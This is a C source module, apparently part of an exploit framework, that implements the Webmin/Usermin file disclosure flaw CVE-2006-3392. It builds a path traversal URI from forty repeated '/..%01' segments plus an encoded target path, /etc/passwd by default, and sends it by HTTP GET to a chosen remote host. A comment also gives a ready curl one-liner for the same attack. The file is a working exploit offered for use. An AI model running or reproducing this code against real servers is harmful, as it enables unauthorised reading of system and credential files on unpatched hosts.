#include <stdio.h>
#include <stdlib.h>
#include "../exploits.h"
#include "../http-client.h"

// manual disclosure
// curl "192.168.56.102:10000/unauthenticated"`perl -e 'print "/..%01"x40'``echo %2Fetc%2Fpasswd`

struct exploitParam fdiscWebminOpts[MAX_NUM_OF_PARAMS] = {
    { "RHOST", REQUIRED, STRING, NOT_SET, NULL, NOT_SET },
    { "RPORT", REQUIRED, STRING, NOT_SET, "10000", 5 },
    { "RPATH", REQUIRED, STRING, NOT_SET, "/etc/passwd", 11 },
    { "Dir", REQUIRED, STRING, NOT_SET, "/unauthenticated", 16 }
};

static int check(struct Xploit *xp)
{
    // TODO: check Webmin/Usermin version
    return 0;
}

void fdiscWebminHelp()
{
    printf("%s[ CVE-2006-3392 ]%s Webmin/Usermin File Disclosure\n", txtblu, txtrst);
    printf("Affected software: Webmin ver. < 1.290, Usermin ver. < 1.220\n");
    printf("References:\n");
    printf("http://secunia.com/advisories/20892/\n");
}

int fdiscWebminFunc(struct Xploit *xp, unsigned char *rawPayload, unsigned int rawPayloadLen)
{
    char uri[1024];
    char host[1024];
    char *rhost = xp->currentExploit->params[0].strValue;
    char *rport = xp->currentExploit->params[1].strValue;
    char *rpath = xp->currentExploit->params[2].strValue;
    char *dir = xp->currentExploit->params[3].strValue;
    char *resp = NULL;
    char *rpathEnc = NULL;
    HTTP_RESPONSE_CODE httpCode;

    // perl -e 'print "/..%01"x40'
    char *pattern = "/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01";

    httpUriEncode(rpath, &rpathEnc);
    sprintf(uri, "%s%s%s", dir, pattern, rpathEnc);
    printf("%s\n", uri);
    httpCode = httpGETRequest(rhost, atoi(rport), uri, &resp, NULL);

    free(rpathEnc);
    free(resp);
    return 0;
}

struct exploit fdiscWebmin = {
    4,
    "fdisc-webmin",
    fdiscWebminFunc,
    fdiscWebminOpts,
    4,
    fdiscWebminHelp, 
    NULL
};
